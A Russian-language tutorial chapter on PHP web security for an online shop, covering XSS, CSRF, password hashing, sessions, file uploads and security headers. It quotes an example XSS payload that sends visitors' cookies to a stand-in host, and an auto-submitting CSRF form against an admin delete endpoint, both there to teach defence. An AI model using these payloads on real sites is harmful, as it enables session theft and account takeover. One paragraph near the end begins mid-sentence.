## 🎯 Зачем эта глава

SQL-инъекции мы закрыли в главе 33. Но это одна из нескольких дыр, через которые
ломают сайты.

В этой главе разберём остальные основные: XSS, CSRF, кражу сессии, слабые пароли,
опасную загрузку файлов. Плюс то, о чём обычно не думают, — что показывать
в сообщениях об ошибках.

Тема не для «потом». Магазин с настоящими деньгами и телефонами покупателей
ломают не из мести, а автоматически: сканеры обходят интернет и пробуют
типовые дыры на всех подряд.

**Главный принцип, который стоит усвоить прежде остального:**

> Любые данные, пришедшие извне, считаются враждебными, пока вы их не проверили.

Извне — это форма, адресная строка, куки, заголовки запроса, файл, ответ чужого
API и даже собственная база данных (в неё могло попасть что угодно раньше).

## 📖 XSS — чужой скрипт на вашей странице

**XSS** (*Cross-Site Scripting*) — злоумышленник добивается, чтобы **его**
JavaScript выполнился в браузере **ваших** посетителей.

### **Как это работает**

Покупатель оставляет отзыв:

```
Отличные колодки!<script>fetch('http://zloy.site/?c='+document.cookie)</script>
```

Вы выводите отзыв как есть:

```php
echo $otzyv['tekst'];    // ❌
```

Теперь у **каждого**, кто откроет страницу товара, выполнится этот скрипт
и отправит его куки на чужой сервер. А в куках — идентификатор сессии.
Злоумышленник вставляет его себе и **входит от имени вашего администратора**.

### **Три вида XSS**

| Вид | Где живёт | Пример |
|---|---|---|
| **Хранимый** | В базе, показывается всем | Отзыв, имя, описание товара |
| **Отражённый** | В адресе, работает по ссылке | `?q=<script>...` |
| **В DOM** | Только в JavaScript | `innerHTML` с данными из адреса |

Хранимый — самый опасный: он бьёт по всем посетителям сразу.

### **Защита: экранирование при выводе**

```php
// ❌ Опасно
echo $otzyv['tekst'];

// ✅ Безопасно
echo htmlspecialchars($otzyv['tekst'], ENT_QUOTES, 'UTF-8');
```

`htmlspecialchars` превращает опасные символы в безопасные записи:

| Было | Стало | Результат |
|---|---|---|
| `<` | `&lt;` | Показывается как текст |
| `>` | `&gt;` | Показывается как текст |
| `"` | `&quot;` | Не разрывает атрибут |
| `'` | `&#039;` | Не разрывает атрибут |
| `&` | `&amp;` | Корректная запись |

Наша короткая обёртка из главы 20:

```php
function e(?string $text): string {
    return htmlspecialchars((string) $text, ENT_QUOTES, 'UTF-8');
}
```

⚠️ **`ENT_QUOTES` обязателен.** Без него одинарные кавычки не экранируются,
и атрибут вида `value='<?= $x ?>'` можно разорвать.

### **Правило: экранировать при выводе, а не при сохранении**

Частая ошибка — экранировать данные перед записью в базу.

Почему так плохо:

- в базе лежит `&lt;текст&gt;` вместо `<текст>` — искать по такому неудобно;
- при выводе в другом месте (в письме, в JSON, в CSV) нужны **другие** правила
  экранирования, а данные уже испорчены;
- двойное экранирование даёт `&amp;lt;` — видимый мусор на странице.

**В базе — как есть. Экранируем в момент вывода, по правилам того места,
куда выводим.**

### **Разные места — разное экранирование**

```php
// В тексте HTML
echo e($tekst);

// В атрибуте — те же правила, но кавычки обязательны
echo '<input value="' . e($znachenie) . '">';

// В адресе
echo '<a href="/search?q=' . urlencode($zapros) . '">';

// В JavaScript
echo '<script>const t = ' . json_encode($tekst, JSON_HEX_TAG | JSON_HEX_AMP) . ';</script>';

// В JSON для API
echo json_encode($dannye, JSON_UNESCAPED_UNICODE);
```

Одно и то же значение в разных местах требует разной обработки.
Подставить HTML-экранирование в адрес — не сработает.

### **Если нужно разрешить разметку**

Иногда HTML в описании товара нужен: списки, жирный текст. Тогда экранировать
нельзя — но и пропускать всё нельзя.

Решение — **белый список тегов** через готовую библиотеку (HTMLPurifier
или аналог). Своими руками не пишите: способов обойти самодельный фильтр
десятки, и вы их все не знаете.

## 📖 CSRF — действие от вашего имени

**CSRF** (*Cross-Site Request Forgery*) — злоумышленник заставляет **браузер
жертвы** отправить запрос на ваш сайт.

### **Как это работает**

Администратор вашего магазина вошёл в админку. Куки с сессией лежат в браузере.

Он открывает другую вкладку — форум, письмо, любой сайт. Там спрятано:

```html
<form action="https://vash-magazin.tj/admin/delete.php" method="POST" id="f">
    <input type="hidden" name="id" value="all">
</form>
<script>document.getElementById('f').submit();</script>
```

Браузер отправляет запрос на ваш сайт **вместе с куками администратора**.
Сервер видит: пришёл POST от авторизованного админа. И выполняет.

Администратор ничего не заметил.

### **Защита: токен**

Идея простая. К каждой форме добавляем секретное значение, которое:

- знает наш сервер;
- знает наша страница;
- **не может узнать чужой сайт**.

```php
<?php
// includes/csrf.php

/** Токен для текущей сессии. Создаётся один раз. */
function csrf_token(): string
{
    if (empty($_SESSION['csrf_token'])) {
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
    }
    return $_SESSION['csrf_token'];
}

/** Скрытое поле для формы. */
function csrf_pole(): string
{
    return '<input type="hidden" name="csrf_token" value="' . e(csrf_token()) . '">';
}

/** Проверка. Вызывается первой строкой в каждом обработчике POST. */
function csrf_proverit(): void
{
    $prishlo = $_POST['csrf_token'] ?? '';

    // hash_equals сравнивает за постоянное время — защита от подбора по таймингу
    if (!is_string($prishlo) || !hash_equals(csrf_token(), $prishlo)) {
        http_response_code(419);
        exit('Сессия устарела. Обновите страницу и попробуйте снова.');
    }
}
```

Применение:

```php
<form method="POST">
    <?= csrf_pole() ?>
    <input type="text" name="imya">
    <button type="submit">Отправить</button>
</form>
```

```php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    csrf_proverit();       // первой строкой
    // дальше обработка
}
```

⚠️ **`hash_equals` вместо `===`.** Обычное сравнение строк прекращается
на первом несовпавшем символе, и по времени ответа можно подбирать токен
посимвольно. `hash_equals` всегда работает одинаково долго.

Приём называется «защита от атаки по времени» и применяется везде, где
сравниваются секреты.

### **Дополнительно: SameSite у куки**

```php
session_set_cookie_params([
    'httponly' => true,     // JavaScript не видит куку — защита от XSS
    'secure'   => true,     // только по HTTPS
    'samesite' => 'Lax',    // не отправлять с чужих сайтов
]);
session_start();
```

**`SameSite=Lax`** говорит браузеру: не отправляй эту куку при запросах,
пришедших с другого сайта. Это второй барьер против CSRF, встроенный в браузер.

**`HttpOnly`** запрещает JavaScript читать куку — даже если XSS случился,
украсть сессию сложнее.

Эти три параметра стоит ставить всегда.

## 📖 Пароли

### **Как нельзя**

```php
// ❌ Открытым текстом — утечка базы = утечка всех паролей
$parol = $_POST['parol'];

// ❌ MD5 и SHA1 — подбираются на видеокарте миллиардами в секунду
$hash = md5($parol);
$hash = sha1($parol);
```

⚠️ Почему это серьёзнее, чем кажется: люди используют один пароль в нескольких
местах. Утечка паролей вашего магазина — это доступ к чьей-то почте
и банковскому кабинету.

### **Как правильно**

```php
// Регистрация
$hash = password_hash($parol, PASSWORD_DEFAULT);
vypolnit('INSERT INTO polzovateli (email, parol_hash) VALUES (?, ?)',
         [$email, $hash]);

// Вход
$polzovatel = zapros_odin('SELECT * FROM polzovateli WHERE email = ?', [$email]);

if ($polzovatel && password_verify($parol, $polzovatel['parol_hash'])) {
    // впустили
}
```

`password_hash` делает три вещи, о которых стоит знать:

1. Использует медленный алгоритм (bcrypt) — подбор становится невыгодным;
2. Добавляет **соль** — случайную примесь, разную для каждого пароля.
   Поэтому одинаковые пароли дают разные хеши, и радужные таблицы бесполезны;
3. Хранит параметры внутри самого хеша, так что `password_verify` знает,
   как проверять.

**Никогда не пишите свою функцию хеширования.** Здесь легко ошибиться
незаметно.

### **Что ещё важно про вход**

```php
// ❌ Подсказывает, какие адреса зарегистрированы
if (!$polzovatel) exit('Такого пользователя нет');
if (!password_verify($parol, $hash)) exit('Неверный пароль');

// ✅ Одинаковый ответ в обоих случаях
if (!$polzovatel || !password_verify($parol, $polzovatel['parol_hash'])) {
    $oshibka = 'Неверная почта или пароль';
}
```

Разные сообщения позволяют **перебрать базу адресов**: злоумышленник узнаёт,
кто у вас зарегистрирован, и дальше атакует точечно.

### **Ограничение попыток**

```php
function proverit_popytki(string $email): void
{
    $popytok = zapros_znachenie('
        SELECT COUNT(*) FROM popytki_vhoda
        WHERE email = ? AND vremya > DATE_SUB(NOW(), INTERVAL 15 MINUTE)
    ', [$email]);

    if ($popytok >= 5) {
        http_response_code(429);
        exit('Слишком много попыток. Попробуйте через 15 минут.');
    }
}
```

Без ограничения пароль подбирается перебором. Пять попыток за пятнадцать минут
не мешают человеку и делают перебор бессмысленным.

## 📖 Сессии

```php
// Правильный старт сессии
session_set_cookie_params([
    'lifetime' => 0,
    'path'     => '/',
    'httponly' => true,
    'secure'   => !empty($_SERVER['HTTPS']),
    'samesite' => 'Lax',
]);
session_start();

// ⚠️ Обязательно после успешного входа
session_regenerate_id(true);
```

**`session_regenerate_id(true)` после входа** закрывает атаку «фиксация сессии»:
злоумышленник заранее подсовывает жертве известный ему идентификатор сессии,
а после её входа пользуется им. Смена идентификатора обесценивает старый.

Правило: **меняйте идентификатор сессии при каждом изменении прав** — вход,
выход, смена роли.

## 📖 Загрузка файлов

Мы касались этого в главе 24, но повторим — это одна из самых опасных точек.

```php
function prinyat_foto(array $fail): string
{
    if ($fail['error'] !== UPLOAD_ERR_OK) {
        throw new RuntimeException('Ошибка загрузки');
    }

    if ($fail['size'] > 2 * 1024 * 1024) {
        throw new RuntimeException('Файл больше 2 МБ');
    }

    // Настоящий тип, а не расширение
    $tip = mime_content_type($fail['tmp_name']);
    $razresheno = [
        'image/jpeg' => 'jpg',
        'image/png'  => 'png',
        'image/webp' => 'webp',
    ];
    if (!isset($razresheno[$tip])) {
        throw new RuntimeException('Только JPG, PNG или WebP');
    }

    // Дополнительно: действительно ли это картинка
    if (@getimagesize($fail['tmp_name']) === false) {
        throw new RuntimeException('Файл повреждён или не картинка');
    }

    // Своё имя — пришедшее может содержать ../
    $imya = bin2hex(random_bytes(16)) . '.' . $razresheno[$tip];
    $put = __DIR__ . '/../storage/uploads/' . $imya;

    if (!move_uploaded_file($fail['tmp_name'], $put)) {
        throw new RuntimeException('Не удалось сохранить');
    }

    return $imya;
}
```

⚠️ **И самое важное — куда класть.** Папка загрузок должна быть настроена так,
чтобы **PHP в ней не выполнялся**. Иначе загруженный файл `foto.jpg`,
внутри которого код, может быть запущен.

В Apache — файл `.htaccess` в папке загрузок:

```apache
php_flag engine off
```

В Nginx — соответствующая настройка в конфигурации сервера.

## 📖 Что показывать при ошибке

```php
// ❌ На боевом сайте
ini_set('display_errors', 1);
```

Текст ошибки PHP содержит **пути на диске, имена файлов, иногда фрагменты кода
и параметры запроса**. Для злоумышленника это карта вашего сервера.

```php
// ✅ Настройка для боевого сайта
ini_set('display_errors', 0);
ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/../storage/logs/php-errors.log');
error_reporting(E_ALL);
```

Ошибки пишутся в файл, посетитель видит вежливую страницу. Подробно — в главе 56.

## 📖 Заголовки безопасности

Несколько строк, которые стоит добавить сразу:

```php
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: SAMEORIGIN');
header('Referrer-Policy: strict-origin-when-cross-origin');
header("Content-Security-Policy: default-src 'self'; img-src 'self' data:;");
```

| Заголовок | От чего защищает |
|---|---|
| `nosniff` | Браузер не будет «угадывать» тип файла |
| `X-Frame-Options` | Ваш сайт не встроят в чужой в невидимом окне |
| `Referrer-Policy` | Чужие сайты не узнают, откуда пришёл посетитель |
| `Content-Security-Policy` | Ограничивает, откуда можно грузить скрипты. **Сильная защита от XSS** |

⚠️ `Content-Security-Policy` требует аккуратной настройки: слишком строгая
политика сломает сторонние скрипты. Начните с мягкой и ужесточайте.

## 📖 Проверьте свой сайт

Список, по которому стоит пройтись:

- [ ] Все запросы к базе — через `prepare` с параметрами
- [ ] Весь вывод — через `htmlspecialchars`
- [ ] У всех форм POST — CSRF-токен и его проверка
- [ ] Пароли — `password_hash`, не MD5
- [ ] Одинаковое сообщение при неверной почте и неверном пароле
- [ ] Ограничение попыток входа
- [ ] `session_regenerate_id(true)` после входа
- [ ] Куки: `HttpOnly`, `Secure`, `SameSite`
- [ ] Загруженные файлы: проверка типа, своё имя, PHP в папке выключен
- [ ] `display_errors = 0` на боевом сайте
- [ ] Пароли и ключи — вне репозитория
- [ ] Отдельный пользователь базы с ограниченными правами
- [ ] HTTPS включён

## ⚠️ Грабли

**Экранировать при сохранении, а не при выводе.** Данные портятся,
экранирование двоится.

**Забыть `ENT_QUOTES`.** Атрибуты можно разорвать одинарной кавычкой.

**Один вид экранирования для всех мест.** HTML, адрес, JavaScript и JSON
требуют разного.

**Формы POST без CSRF-токена.** Особенно в админке.

**`===` вместо `hash_equals` для токенов.** Подбор по времени ответа.

**MD5 для паролей.** Подбирается за секунды.

**Разные сообщения «нет пользователя» и «неверный пароль».** Позволяет
перебрать базу адресов.

**Не менять идентификатор сессии после входа.** Фиксация сессии.

**Проверять файл по расширению.** `virus.php.jpg` пройдёт.

**`display_errors` на боевом сайте.** Выдаёт устройство сервера.

и пароли живут в таблице `site_settings` или в git-ignored файле, **никогда
в репозитории**.

Ещё одна деталь, которую стоит заметить: в проекте есть жёсткое ограничение
на массовые запросы к чужим API. Не только из вежливости — за перебор чужого
сервиса блокируют рабочий аккаунт, и магазин остаётся без цен. Безопасность —
это и про то, чтобы не навредить самому себе.

## 📌 Итог

- **Всё, что пришло извне, — враждебно, пока не проверено.**
- **XSS**: экранируйте **при выводе** через `htmlspecialchars` с `ENT_QUOTES`.
- В базе храните как есть, экранируйте по правилам того места, куда выводите.
- **CSRF**: токен в каждой форме POST плюс `hash_equals` при проверке.
- Куки: `HttpOnly`, `Secure`, `SameSite=Lax`.
- **Пароли**: только `password_hash` / `password_verify`. Никогда MD5.
- Одинаковое сообщение при неверной почте и пароле.
- Ограничивайте попытки входа.
- `session_regenerate_id(true)` после входа.
- Файлы: настоящий тип, своё имя, PHP в папке загрузок выключен.
- `display_errors = 0` на боевом сайте, ошибки — в лог.
